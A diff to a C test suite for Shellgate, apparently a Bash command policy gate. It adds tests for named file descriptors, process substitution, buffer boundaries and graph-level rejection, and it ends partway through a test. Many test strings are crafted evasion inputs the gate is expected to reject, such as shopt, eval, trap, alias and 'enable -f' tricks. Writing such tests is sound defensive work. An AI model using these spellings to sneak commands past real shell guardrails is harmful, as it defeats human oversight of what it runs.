@@ -1,5 +1,6 @@
 #include "sg_anomaly.h"
 #include "shell_abstract.h"
+#include "shell_depgraph.h"
 #include "shell_processor.h"
 #include "shell_sequence.h"
 #include "shell_tokenizer.h"
@@ -8,6 +9,7 @@
 #include "test_io.h"
 #include "test_sg_failures.h"
 #include <math.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -97,7 +99,11 @@ static int fail_count = 0;
 
 #define MAX_TEMP_FILES 16
 
-static char eval_buf[16384];
+/* The evaluation buffer owns both diagnostic strings and the bounded
+ * dependency-graph workspace. Keep normal test evaluation on the public
+ * size-hint path's safe side; small-prefix contracts below deliberately pass
+ * a narrower view of this same storage. */
+static char eval_buf[3u * 1024u * 1024u];
 static char *temp_files[MAX_TEMP_FILES];
 static int temp_file_count = 0;
 
@@ -182,6 +188,106 @@ static sg_error_t add_exact_outer_rule(sg_gate_t *gate, const char *command) {
 static sg_error_t eval_cmd(sg_gate_t *g, const char *cmd, sg_result_t *r) {
   memset(eval_buf, 0, sizeof(eval_buf));
   return sg_gate_evaluate(g, cmd, strlen(cmd), eval_buf, sizeof(eval_buf), r);
+}
+
+/* Reserve the evaluator's aligned depgraph tail while constraining only the
+ * result-string prefix. This keeps truncation tests about diagnostics rather
+ * than accidentally testing the separate workspace contract. */
+static size_t eval_buffer_size_for_prefix(size_t prefix_size) {
+  size_t workspace_size = 0;
+  size_t alignment = shell_dep_workspace_alignment();
+  if (!shell_dep_workspace_size(NULL, &workspace_size) || alignment == 0)
+    return 0;
+  uintptr_t begin = (uintptr_t)(void *)eval_buf;
+  if (prefix_size > UINTPTR_MAX - begin)
+    return 0;
+  uintptr_t workspace = begin + prefix_size;
+  uintptr_t remainder = workspace % alignment;
+  if (remainder != 0)
+    workspace += alignment - remainder;
+  if (workspace > UINTPTR_MAX - workspace_size)
+    return 0;
+  size_t total = (size_t)(workspace + workspace_size - begin);
+  return total <= sizeof(eval_buf) ? total : 0;
+}
+
+/* Mirror only the public workspace-placement contract so boundary tests can
+ * prove graph-backed result fields do not escape into the private tail. */
+static size_t eval_result_prefix_size(size_t buffer_size) {
+  size_t workspace_size = 0;
+  size_t alignment = shell_dep_workspace_alignment();
+  if (buffer_size == 0 || !shell_dep_workspace_size(NULL, &workspace_size) ||
+      alignment == 0 || workspace_size > buffer_size)
+    return 0;
+  uintptr_t begin = (uintptr_t)(void *)eval_buf;
+  if (buffer_size > UINTPTR_MAX - begin)
+    return 0;
+  uintptr_t start = begin + buffer_size - workspace_size;
+  uintptr_t padding = start % alignment;
+  if (padding > start || start - padding < begin)
+    return 0;
+  start -= padding;
+  return start == begin ? 0 : (size_t)(start - begin);
+}
+
+static bool result_string_in_prefix(const char *value, size_t prefix_size) {
+  if (!value)
+    return true;
+  uintptr_t begin = (uintptr_t)(void *)eval_buf;
+  uintptr_t address = (uintptr_t)(void *)value;
+  if (address < begin || address - begin >= prefix_size)
+    return false;
+  return memchr(value, '\0', prefix_size - (size_t)(address - begin)) != NULL;
+}
+
+static bool result_span_in_prefix(const char *value, size_t length,
+                                  size_t prefix_size) {
+  if (!value)
+    return length == 0;
+  uintptr_t begin = (uintptr_t)(void *)eval_buf;
+  uintptr_t address = (uintptr_t)(void *)value;
+  if (address < begin || address - begin > prefix_size)
+    return false;
+  return length <= prefix_size - (size_t)(address - begin);
+}
+
+/* The depgraph workspace occupies the buffer tail after graph construction.
+ * Every public result pointer must stay in the prefix; this checks every
+ * distinct string-bearing result field rather than only command/netargv. */
+static bool result_fields_stay_in_prefix(const sg_result_t *result,
+                                         size_t prefix_size) {
+  if (!result || !result_string_in_prefix(result->deny_reason, prefix_size))
+    return false;
+  for (uint32_t i = 0; i < result->subcommand_count; i++) {
+    const sg_subcommand_result_t *subcommand = &result->subcommands[i];
+    if (!result_string_in_prefix(subcommand->display_command, prefix_size) ||
+        !result_string_in_prefix(subcommand->reject_reason, prefix_size) ||
+        !result_span_in_prefix(subcommand->netargv, subcommand->netargv_length,
+                               prefix_size))
+      return false;
+  }
+  for (uint32_t i = 0; i < result->suggestion_count; i++)
+    if (!result_string_in_prefix(result->suggestions[i], prefix_size))
+      return false;
+  for (uint32_t i = 0; i < result->deny_suggestion_count; i++)
+    if (!result_string_in_prefix(result->deny_suggestions[i], prefix_size))
+      return false;
+  for (uint32_t i = 0; i < result->violation_count; i++)
+    if (!result_string_in_prefix(result->violations[i].description,
+                                 prefix_size) ||
+        !result_string_in_prefix(result->violations[i].detail, prefix_size))
+      return false;
+  return true;
+}
+
+static sg_error_t eval_with_prefix(sg_gate_t *gate, const char *command,
+                                   size_t prefix_size, sg_result_t *result) {
+  size_t buffer_size = eval_buffer_size_for_prefix(prefix_size);
+  if (buffer_size == 0)
+    return SG_ERR_MEMORY;
+  memset(eval_buf, 0, buffer_size);
+  return sg_gate_evaluate(gate, command, strlen(command), eval_buf, buffer_size,
+                          result);
 }
 
 /* --- LIFECYCLE --- */
@@ -281,6 +387,31 @@ TEST(shell_list_parse_boundary_contract) {
     ASSERT(!result.truncated);
     ASSERT_STR(eval_buf, "parse error");
   }
+  sg_gate_free(gate);
+}
+
+/* Bash's raw duplication close marker ends at `-`, not at the end of an
+ * adjacent shell word. Keep Shellgate's public canonical result aligned with
+ * the parser and reject the same spelling after a compound group. */
+TEST(raw_close_marker_shellgate_contract) {
+  sg_gate_t *gate = gate_with_rules((const char *[]){"printf * *"}, 1);
+  ASSERT(gate != NULL);
+
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, "printf x >&-file", &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1 &&
+         result.subcommands[0].netargv != NULL &&
+         result.subcommands[0].netargv_length ==
+             strlen("6:printf,1:x,4:file,") &&
+         memcmp(result.subcommands[0].netargv, "6:printf,1:x,4:file,",
+                result.subcommands[0].netargv_length) == 0);
+
+  memset(&result, 0, sizeof(result));
+  ASSERT(sg_gate_evaluate(gate, "{ printf x; } >&-file",
+                          strlen("{ printf x; } >&-file"), eval_buf,
+                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
+  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count <= 1 &&
+         !result.truncated && strcmp(eval_buf, "parse error") == 0);
   sg_gate_free(gate);
 }
 
@@ -514,9 +645,7 @@ TEST(basic_evaluation_matrix) {
     ASSERT(strcmp(diagnostic, "parse error") == 0);
   }
 
-  char truncated[4];
-  ASSERT(sg_gate_evaluate(g, "{ echo x; }", 11, truncated, sizeof(truncated),
-                          &result) == SG_ERR_TRUNC);
+  ASSERT(eval_with_prefix(g, "{ echo x; }", 4, &result) == SG_ERR_TRUNC);
   ASSERT(result.truncated);
   ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
   sg_gate_free(g);
@@ -595,6 +724,476 @@ TEST(process_substitution_wildcard_policy) {
   ASSERT(result.subcommand_count == 3);
   ASSERT(result.subcommands[1].matches);
   ASSERT(result.subcommands[1].verdict == SG_VERDICT_ALLOW);
+  sg_gate_free(gate);
+}
+
+/* A named descriptor allocation is not an outer-command write by itself.
+ * Shellgate should still evaluate every executable stage, preserve the
+ * ordinary process-substitution dynamic-I/O marker, and allow the later exact
+ * `$name` descriptor use to carry the payload to its consumer. */
+TEST(named_fd_process_substitution_policy_contract) {
+  static const char command[] =
+      "exec {sink}> >(cat); printf payload >&\"${sink}\"";
+  sg_gate_t *gate = gate_with_rules(
+      (const char *[]){"exec", "cat", "producer", "printf *"}, 4);
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+  ASSERT_SG_OK(sg_gate_enable_anomaly(gate, 1e300, NULL));
+
+  sg_result_t result = {0};
+  for (size_t pass = 0; pass < 3; pass++) {
+    ASSERT_SG_OK(eval_cmd(gate, command, &result));
+    ASSERT(result.verdict == SG_VERDICT_ALLOW);
+    ASSERT(result.subcommand_count == 3);
+    ASSERT(result.has_dynamic_substitution_io);
+    ASSERT(!result.requires_substitution_evaluation);
+    ASSERT(!result.subcommands[0].has_dynamic_substitution_io);
+    ASSERT(result.subcommands[1].has_dynamic_substitution_io);
+    ASSERT(!result.subcommands[2].has_dynamic_substitution_io);
+    ASSERT_STR(result.subcommands[2].netargv, "6:printf,7:payload,");
+    if (pass == 0)
+      ASSERT(isinf(result.anomaly_score));
+    else
+      ASSERT(isfinite(result.anomaly_score));
+  }
+  ASSERT(sg_gate_anomaly_vocab_size(gate) > 0);
+
+  /* Input process substitution is retained as a named-FD setup until a later
+   * exact `$source` use. Its producer-to-exec route is still represented
+   * dynamic topology, but setup neither moves bytes nor asks the caller to
+   * inspect data as code. */
+  ASSERT_SG_OK(
+      eval_cmd(gate, "exec {source}< <(producer); printf payload", &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3 &&
+         result.has_dynamic_substitution_io &&
+         !result.requires_substitution_evaluation);
+  bool source_setup_owner = false;
+  bool source_producer = false;
+  bool source_payload = false;
+  for (uint32_t i = 0; i < result.subcommand_count; i++) {
+    const sg_subcommand_result_t *subcommand = &result.subcommands[i];
+    if (subcommand->display_command == NULL)
+      continue;
+    if (strcmp(subcommand->display_command, "exec") == 0)
+      source_setup_owner = subcommand->has_dynamic_substitution_io &&
+                           !subcommand->requires_substitution_evaluation &&
+                           subcommand->substitution_consumer_index == -1;
+    else if (strcmp(subcommand->display_command, "producer") == 0)
+      source_producer = !subcommand->has_dynamic_substitution_io &&
+                        subcommand->substitution_consumer_index == -1;
+    else if (strncmp(subcommand->display_command, "printf", 6) == 0)
+      source_payload = !subcommand->has_dynamic_substitution_io;
+  }
+  ASSERT(source_setup_owner && source_producer && source_payload);
+
+  /* Both nested producers redirect their inherited stdout away. The retained
+   * endpoint has no producer command edge, but the named input setup remains
+   * dynamic topology and the later exact descriptor use supplies cat. */
+  ASSERT_SG_OK(eval_cmd(gate,
+                        "exec {source}< <(printf first >/tmp/source-first; "
+                        "printf second >/tmp/source-second); cat <&\"$source\"",
+                        &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 4 &&
+         result.has_dynamic_substitution_io &&
+         !result.requires_substitution_evaluation);
+  uint32_t redirected_producers = 0;
+  bool unconnected_source_setup = false;
+  bool unconnected_source_consumer = false;
+  for (uint32_t i = 0; i < result.subcommand_count; i++) {
+    const sg_subcommand_result_t *subcommand = &result.subcommands[i];
+    if (subcommand->display_command == NULL)
+      continue;
+    if (strcmp(subcommand->display_command, "exec") == 0)
+      unconnected_source_setup = subcommand->has_dynamic_substitution_io;
+    else if (strncmp(subcommand->display_command, "printf", 6) == 0) {
+      redirected_producers++;
+      ASSERT(!subcommand->has_dynamic_substitution_io);
+    } else if (strcmp(subcommand->display_command, "cat") == 0)
+      unconnected_source_consumer = subcommand->has_dynamic_substitution_io;
+  }
+  ASSERT(unconnected_source_setup && redirected_producers == 2 &&
+         unconnected_source_consumer);
+
+  /* The matching output form has setup topology but no nested stdin flow:
+   * the nested cat supplied its own input. The result remains dynamically
+   * structured, while no simple command is falsely reported as its byte-flow
+   * consumer. */
+  ASSERT_SG_OK(eval_cmd(gate,
+                        "exec {sink}> >(cat </tmp/named-sink); "
+                        "printf payload >&\"$sink\"",
+                        &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3 &&
+         result.has_dynamic_substitution_io &&
+         !result.requires_substitution_evaluation);
+  for (uint32_t i = 0; i < result.subcommand_count; i++)
+    ASSERT(!result.subcommands[i].has_dynamic_substitution_io);
+
+  /* Ordinary named file setup and descriptor duplication are not process
+   * substitutions and must not inherit the dynamic-topology marker. */
+  ASSERT_SG_OK(
+      eval_cmd(gate, "exec {source}</tmp/input; printf payload", &result));
+  ASSERT(!result.has_dynamic_substitution_io &&
+         !result.requires_substitution_evaluation);
+  ASSERT_SG_OK(eval_cmd(gate, "exec {source}<&0; printf payload", &result));
+  ASSERT(!result.has_dynamic_substitution_io &&
+         !result.requires_substitution_evaluation);
+
+  /* The group body's exec allocation is visible when a later word starts a
+   * nested shell. It must reach policy evaluation, not fail graph parsing. */
+  ASSERT_SG_OK(eval_cmd(gate,
+                        "{ exec {fd}</tmp/group-input; "
+                        "printf '%s' \"$(cat <&$fd)\"; }",
+                        &result));
+  ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
+         result.subcommand_count == 3 &&
+         result.requires_substitution_evaluation);
+
+  /* A comment after the group's redirects cannot make its descriptor state
+   * conditional merely by containing connector punctuation. */
+  static const char *const commented_connectors[] = {
+      "{ exec {fd}</tmp/group-input; } >/dev/null # && comment\n"
+      "printf '%s' \"$(cat <&$fd)\"",
+      "{ exec {fd}</tmp/group-input; } >/dev/null # || comment\n"
+      "printf '%s' \"$(cat <&$fd)\"",
+  };
+  for (size_t i = 0;
+       i < sizeof(commented_connectors) / sizeof(commented_connectors[0]);
+       i++) {
+    ASSERT_SG_OK(eval_cmd(gate, commented_connectors[i], &result));
+    ASSERT(result.verdict == SG_VERDICT_UNDETERMINED &&
+           result.requires_substitution_evaluation);
+  }
+  ASSERT_SG_OK(
+      eval_cmd(gate, "echo `printf x; printf y`; printf done", &result));
+  ASSERT(result.subcommand_count >= 3 &&
+         result.requires_substitution_evaluation);
+
+  ASSERT(sg_gate_evaluate(gate, "printf payload >&\"$missing\"",
+                          strlen("printf payload >&\"$missing\""), eval_buf,
+                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
+  /* A graph-level rejection exposes Shellgate's documented one synthetic
+   * result, never a partially evaluated executable command. */
+  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
+         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
+         strcmp(eval_buf, "depgraph error") == 0);
+
+  /* A complete glob may expand to a descriptor number, so legacy `>&word`
+   * must reject it rather than claiming combined file output. An unmatched
+   * bracket is literal and therefore keeps a dynamic filename topology. */
+  ASSERT(sg_gate_evaluate(gate, "printf payload >&[[:digit:]]",
+                          strlen("printf payload >&[[:digit:]]"), eval_buf,
+                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
+  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
+         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
+         strcmp(eval_buf, "depgraph error") == 0);
+  ASSERT_SG_OK(sg_gate_evaluate(gate, "printf payload >&[$fd",
+                                strlen("printf payload >&[$fd"), eval_buf,
+                                sizeof(eval_buf), &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 1 &&
+         result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
+         strcmp(result.subcommands[0].netargv, "6:printf,7:payload,") == 0);
+
+  /* The descriptor is not visible to a word expansion in the command which
+   * allocates it. Under Bash's default `varredir_close` behavior, however, a
+   * preceding ordinary command does retain an open named descriptor. */
+  static const char *const snapshot_rejections[] = {
+      "printf payload {fd}</tmp/in \"$(cat <&$fd)\"",
+      "exec {fd}</tmp/in; exec {fd}<&-; printf payload \"$(cat <&$fd)\"",
+      "printf > >(cat <&$fd) {fd}</tmp/in",
+      ("shopt -s varredir_close; : {fd}</tmp/in; "
+       "printf payload \"$(cat <&$fd)\""),
+      ("x+=value shopt -u varredir_close; : {fd}</tmp/in; "
+       "printf payload \"$(cat <&$fd)\""),
+      ("x+\\\n=value shopt -s varredir_close; : {fd}</tmp/in; "
+       "printf payload \"$(cat <&$fd)\""),
+      ("sh'opt' '-s' varredir_close; : {fd}</tmp/in; "
+       "printf payload \"$(cat <&$fd)\""),
+      ("shopt -s lastpipe; printf source | : {fd}</tmp/in; "
+       "printf payload \"$(cat <&$fd)\""),
+      ("command shopt -u lastpipe; printf source | : {fd}</tmp/in; "
+       "printf payload \"$(cat <&$fd)\""),
+      ("eval 'shopt -s lastpipe'; printf source | : {fd}</tmp/in; "
+       "printf payload \"$(cat <&$fd)\""),
+      (". /tmp/shell-state; printf source | : {fd}</tmp/in; "
+       "printf payload \"$(cat <&$fd)\""),
+      ("command source /tmp/shell-state; printf source | : {fd}</tmp/in; "
+       "printf payload \"$(cat <&$fd)\""),
+      ("trap 'shopt -s lastpipe' DEBUG; printf source | : {fd}</tmp/in; "
+       "printf payload \"$(cat <&$fd)\""),
+      ("alias change_scope='shopt -s lastpipe'; "
+       "printf source | : {fd}</tmp/in; printf payload \"$(cat <&$fd)\""),
+      ("shopt -s expand_aliases; printf source | : {fd}</tmp/in; "
+       "printf payload \"$(cat <&$fd)\""),
+      ("history -s 'shopt -s lastpipe'; fc -s -1; "
+       "printf source | : {fd}</tmp/in; printf payload \"$(cat <&$fd)\""),
+      ("enable -f /tmp/shell-state change_scope; "
+       "printf source | : {fd}</tmp/in; printf payload \"$(cat <&$fd)\""),
+      /* Dynamic selectors can mutate current-shell POSIX mode or assign a
+       * mode-changing variable. Shellgate must reject them before policy
+       * evaluation, regardless of the eventual expansion value. */
+      "set -o \"$option\"; printf payload",
+      "shopt -s -o posix; printf payload",
+      "shopt -so posix; printf payload",
+      "command shopt -s -o posix; printf payload",
+      "shopt -s -o \"$option\"; printf payload",
+      "printf -v \"$target\" enabled; printf payload",
+      ": $((fd1++)); printf payload",
+      ": $(( $(printf 'fd=12') )); printf payload",
+      "command pushd /tmp; printf payload",
+      "builtin popd; printf payload",
+      ("exec {fd}>/tmp/out; printf -v 'fd[0]' enabled; "
+       "printf payload >&$fd"),
+      ("exec {fd}>/tmp/out; read -a fd; printf payload >&$fd"),
+      ("exec {fd}>/tmp/out; wait -p fd; printf payload >&$fd"),
+      ("exec {fd}>/tmp/out; : $((fd=9)); printf payload >&$fd"),
+      "mapfile -c 1 -C 'printf callback' values </tmp/input; printf payload",
+      ("exec {fd}>/tmp/readonly-first; readonly fd; "
+       "exec {fd}>/tmp/readonly-second; printf payload >&$fd"),
+      ("exec {fd}>/tmp/readonly-first; declare -r fd; "
+       "exec {fd}>/tmp/readonly-second; printf payload >&$fd"),
+      ("exec {fd}>/tmp/readonly-first; typeset -r fd; "
+       "exec {fd}>/tmp/readonly-second; printf payload >&$fd"),
+      ("exec {fd}>/tmp/readonly-first; command -p readonly fd; "
+       "exec {fd}>/tmp/readonly-second; printf payload >&$fd"),
+      ("( printf payload >&$fd ) {fd}>/tmp/subshell-out; "
+       "printf payload >&$fd"),
+      ("false && { :; exec {fd}</tmp/skipped; }; "
+       "printf payload \"$(cat <&$fd)\""),
+      ("true || { :; exec {fd}</tmp/skipped; }; "
+       "printf payload \"$(cat <&$fd)\""),
+  };
+  for (size_t i = 0;
+       i < sizeof(snapshot_rejections) / sizeof(snapshot_rejections[0]); i++) {
+    ASSERT(sg_gate_evaluate(gate, snapshot_rejections[i],
+                            strlen(snapshot_rejections[i]), eval_buf,
+                            sizeof(eval_buf), &result) == SG_ERR_PARSE);
+    ASSERT(result.verdict == SG_VERDICT_REJECT &&
+           result.subcommand_count == 1 &&
+           result.subcommands[0].verdict == SG_VERDICT_REJECT &&
+           strcmp(eval_buf, "depgraph error") == 0);
+  }
+
+  static const char persisted_named_fd[] =
+      "printf payload {fd}>/tmp/out; printf payload >&$fd";
+  ASSERT_SG_OK(sg_gate_evaluate(gate, persisted_named_fd,
+                                sizeof(persisted_named_fd) - 1, eval_buf,
+                                sizeof(eval_buf), &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW);
+  ASSERT(result.subcommand_count == 2);
+  ASSERT(result.subcommands[0].verdict == SG_VERDICT_ALLOW);
+  ASSERT(result.subcommands[1].verdict == SG_VERDICT_ALLOW);
+
+  /* Descriptor identity follows Shellsplit's physical-line-ending handling,
+   * so a binding and its later reference need not share one raw spelling. */
+  static const char *const continued_named_fd[] = {
+      "exec {f\\\rd}>/tmp/bare-cr-out; printf payload >&$fd",
+      "exec {fd}>/tmp/bare-cr-reference; printf payload >&$f\\\rd",
+      "exec {f\\\r\nd}>/tmp/crlf-out; printf payload >&$fd",
+      "exec {fd}>/tmp/crlf-reference; printf payload >&\"${f\\\r\nd}\"",
+      "exec {fd}>/tmp/dollar-lf-reference; printf payload >&$\\\n{fd}",
+      "exec {fd}>/tmp/dollar-crlf-reference; printf payload >&$\\\r\n{fd}",
+      "exec {fd}>/tmp/dollar-cr-reference; printf payload >&$\\\r{fd}",
+      "exec {fd}>/tmp/dollar-quoted-reference; printf payload >&\"$\\\n{fd}\"",
+  };
+  for (size_t i = 0;
+       i < sizeof(continued_named_fd) / sizeof(continued_named_fd[0]); i++) {
+    ASSERT_SG_OK(eval_cmd(gate, continued_named_fd[i], &result));
+    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2 &&
+           result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
+           result.subcommands[1].verdict == SG_VERDICT_ALLOW &&
+           result.subcommands[1].write_count == 0);
+  }
+
+  /* A persistent named-FD close is valid setup in its own right, but a later
+   * exact descriptor use must fail graph resolution rather than be evaluated
+   * against the retired binding. */
+  static const char closed_named_fd[] =
+      "exec {fd}>/tmp/closed-out; exec {fd}>&-";
+  ASSERT_SG_OK(sg_gate_evaluate(gate, closed_named_fd,
+                                sizeof(closed_named_fd) - 1, eval_buf,
+                                sizeof(eval_buf), &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2 &&
+         result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
+         result.subcommands[1].verdict == SG_VERDICT_ALLOW);
+
+  static const char closed_named_fd_use[] =
+      "exec {fd}>/tmp/closed-out; exec {fd}>&-; printf payload >&$fd";
+  ASSERT(sg_gate_evaluate(gate, closed_named_fd_use,
+                          sizeof(closed_named_fd_use) - 1, eval_buf,
+                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
+  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
+         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
+         strcmp(eval_buf, "depgraph error") == 0);
+
+  /* Assignment prefixes are temporary in Bash. Shellgate must not reject the
+   * command by discarding the descriptor route before its redirect expands. */
+  static const char prefixed_named_fd[] =
+      "exec {fd}>/tmp/prefix-out; fd=shadow printf payload >&$fd; "
+      "printf payload >&$fd";
+  ASSERT_SG_OK(sg_gate_evaluate(gate, prefixed_named_fd,
+                                sizeof(prefixed_named_fd) - 1, eval_buf,
+                                sizeof(eval_buf), &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3 &&
+         result.subcommands[1].verdict == SG_VERDICT_ALLOW &&
+         result.subcommands[2].verdict == SG_VERDICT_ALLOW);
+
+  static const char prefixed_append_named_fd[] =
+      "exec {fd}>/tmp/prefix-append-out; fd+=shadow printf payload >&$fd; "
+      "printf payload >&$fd";
+  ASSERT_SG_OK(sg_gate_evaluate(gate, prefixed_append_named_fd,
+                                sizeof(prefixed_append_named_fd) - 1, eval_buf,
+                                sizeof(eval_buf), &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 3 &&
+         result.subcommands[1].verdict == SG_VERDICT_ALLOW &&
+         result.subcommands[2].verdict == SG_VERDICT_ALLOW);
+
+  /* An assignment-only command changes the descriptor variable instead. */
+  static const char reassigned_named_fd[] =
+      "exec {fd}>/tmp/reassigned-out; f\\\nd=shadow; printf payload >&$fd";
+  ASSERT(sg_gate_evaluate(gate, reassigned_named_fd,
+                          sizeof(reassigned_named_fd) - 1, eval_buf,
+                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
+  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
+         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
+         strcmp(eval_buf, "depgraph error") == 0);
+
+  static const char reassigned_append_named_fd[] =
+      "exec {fd}>/tmp/reassigned-append-out; f\\\n"
+      "d+=shadow; printf payload >&$fd";
+  ASSERT(sg_gate_evaluate(gate, reassigned_append_named_fd,
+                          sizeof(reassigned_append_named_fd) - 1, eval_buf,
+                          sizeof(eval_buf), &result) == SG_ERR_PARSE);
+  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
+         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
+         strcmp(eval_buf, "depgraph error") == 0);
+
+  /* The policy surface receives canonical argv after quote removal, while the
+   * graph must also preserve the current-shell numeric descriptor route. */
+  static const char quoted_persistent_exec[] =
+      "e'x'ec 3>/tmp/quoted-out; printf payload >&3";
+  ASSERT_SG_OK(sg_gate_evaluate(gate, quoted_persistent_exec,
+                                sizeof(quoted_persistent_exec) - 1, eval_buf,
+                                sizeof(eval_buf), &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2 &&
+         result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
+         result.subcommands[1].verdict == SG_VERDICT_ALLOW);
+  ASSERT_STR(result.subcommands[0].netargv, "4:exec,");
+  ASSERT_STR(result.subcommands[1].netargv, "6:printf,7:payload,");
+
+  /* Shellgate's anomaly path builds canonical command sequences after graph
+   * analysis. A group-tail symbolic duplication with whitespace must reach
+   * both surfaces successfully, rather than becoming a late parse failure. */
+  static const char grouped_whitespace_named_fd[] =
+      "exec {sink}> >(cat); { printf payload; } >& \"${sink}\"";
+  ASSERT_SG_OK(sg_gate_evaluate(gate, grouped_whitespace_named_fd,
+                                sizeof(grouped_whitespace_named_fd) - 1,
+                                eval_buf, sizeof(eval_buf), &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW);
+  ASSERT(result.subcommand_count == 3);
+  ASSERT(result.has_dynamic_substitution_io);
+  ASSERT(result.subcommands[2].verdict == SG_VERDICT_ALLOW);
+  ASSERT_STR(result.subcommands[2].netargv, "6:printf,7:payload,");
+  sg_gate_free(gate);
+}
+
+TEST(named_fd_builtin_mutation_redirect_policy_contract) {
+  sg_gate_t *gate =
+      gate_with_rules((const char *[]){"exec", "unset *", "read *", "printf *",
+                                       "printf -v fd shadow", "cat *"},
+                      6);
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+
+  static const char *const supported[] = {
+      "exec {fd}>/tmp/mutation-output; unset fd >&$fd",
+      "exec {fd}>/tmp/mutation-output; printf -v fd shadow >&$fd",
+      "exec {fd}</tmp/mutation-input; read fd <&$fd",
+  };
+  sg_result_t result = {0};
+  for (size_t i = 0; i < sizeof(supported) / sizeof(supported[0]); i++) {
+    ASSERT_SG_OK(eval_cmd(gate, supported[i], &result));
+    ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 2 &&
+           result.subcommands[0].verdict == SG_VERDICT_ALLOW &&
+           result.subcommands[1].verdict == SG_VERDICT_ALLOW);
+  }
+
+  static const char *const invalid_after[] = {
+      "exec {fd}>/tmp/mutation-output; unset fd >&$fd; printf x >&$fd",
+      "exec {fd}>/tmp/mutation-output; unset fd >&$fd && printf x >&$fd",
+      "exec {fd}</tmp/mutation-input; read fd <&$fd; cat <&$fd",
+      "exec {fd}>/tmp/mutation-output; fd=shadow >&$fd",
+      "printf -v fd shadow {fd}>/tmp/mutation-output; printf x >&$fd",
+      "printf -v fd shadow {fd}>/tmp/mutation-output && printf x >&$fd",
+      "unset fd {fd}>/tmp/mutation-output; printf x >&$fd",
+  };
+  for (size_t i = 0; i < sizeof(invalid_after) / sizeof(invalid_after[0]);
+       i++) {
+    ASSERT(eval_cmd(gate, invalid_after[i], &result) == SG_ERR_PARSE);
+    ASSERT(result.verdict == SG_VERDICT_REJECT &&
+           result.subcommand_count == 1 &&
+           result.subcommands[0].verdict == SG_VERDICT_REJECT);
+  }
+  sg_gate_free(gate);
+}
+
+/* Static quote removal applies to descriptor-variable mutations too. Shellgate
+ * must keep an unrelated named route usable while a dynamic target continues
+ * to reject the graph before partially evaluating its command sequence. */
+TEST(quoted_named_fd_mutation_policy_contract) {
+  sg_gate_t *gate =
+      gate_with_rules((const char *[]){"exec", "unset *", "printf *"}, 3);
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
+
+  static const char quoted_target[] =
+      "exec {left}>/tmp/left; exec {right}>/tmp/right; unset 'left'; "
+      "printf payload >&$right";
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate, quoted_target, &result));
+  ASSERT(result.verdict == SG_VERDICT_ALLOW && result.subcommand_count == 4);
+  for (size_t i = 0; i < result.subcommand_count; i++)
+    ASSERT(result.subcommands[i].verdict == SG_VERDICT_ALLOW);
+
+  static const char dynamic_target[] =
+      "exec {left}>/tmp/left; exec {right}>/tmp/right; unset \"$target\"; "
+      "printf payload >&$right";
+  ASSERT(sg_gate_evaluate(gate, dynamic_target, sizeof(dynamic_target) - 1,
+                          eval_buf, sizeof(eval_buf), &result) == SG_ERR_PARSE);
+  ASSERT(result.verdict == SG_VERDICT_REJECT && result.subcommand_count == 1 &&
+         result.subcommands[0].verdict == SG_VERDICT_REJECT &&
+         strcmp(eval_buf, "depgraph error") == 0);
+  sg_gate_free(gate);
+}
+
+TEST(decoded_assignment_policy_contract) {
+  sg_gate_t *gate =
+      gate_with_rules((const char *[]){"exec", "export *", "printf *"}, 3);
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  sg_result_t result = {0};
+  ASSERT_SG_OK(eval_cmd(gate,
+                        "exec {fd}>/tmp/route; "
+                        "export \"OTHER=$(printf data)\"; "
+                        "printf payload >&$fd",
+                        &result));
+  ASSERT(result.verdict != SG_VERDICT_REJECT);
+
